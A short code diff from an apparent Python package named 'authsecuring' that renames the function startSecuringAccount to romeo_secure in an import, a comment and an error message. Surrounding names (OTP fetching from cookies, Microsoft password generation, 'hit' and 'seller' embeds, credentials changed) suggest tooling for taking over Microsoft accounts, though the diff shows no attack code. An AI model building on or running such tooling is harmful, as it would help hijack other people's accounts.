@@ -5,7 +5,7 @@ from authsecuring.utils.security.recovery import recover, verify_password_works,
 from authsecuring.utils.security.password_gen import generate_ms_password
 from authsecuring.utils.cookies.get_email_code import fetch_otp
 from authsecuring.utils.login_pwd import login_pwd
-from authsecuring.orch import startSecuringAccount
+from authsecuring.orch import romeo_secure
 from authsecuring.auth.send_auth import send_auth
 from authsecuring.auth.handle_redirects import handle_redirects, get_data
 from authsecuring.auth.polish_host import polish_host
@@ -828,7 +828,7 @@ async def romeo_recover(
                         raise
 
                 if isinstance(account, dict) and account.get("failed"):
-                    # Keep reject embeds from startSecuringAccount (include sunny@ primary).
+                    # Keep reject embeds from romeo_secure (include sunny@ primary).
                     # Re-wrapping via _failure_result without primary_email was wiping it.
                     if account.get("hit_embed") or account.get("seller_embed"):
                         ms = account.get("microsoft") or {}
@@ -863,7 +863,7 @@ async def romeo_recover(
                         security_email=security_email,
                         password=password,
                         recovery_code=new_recovery_code,
-                        error="startSecuringAccount returned no account data.",
+                        error="romeo_secure returned no account data.",
                         credentials_changed=True,
                     )
 
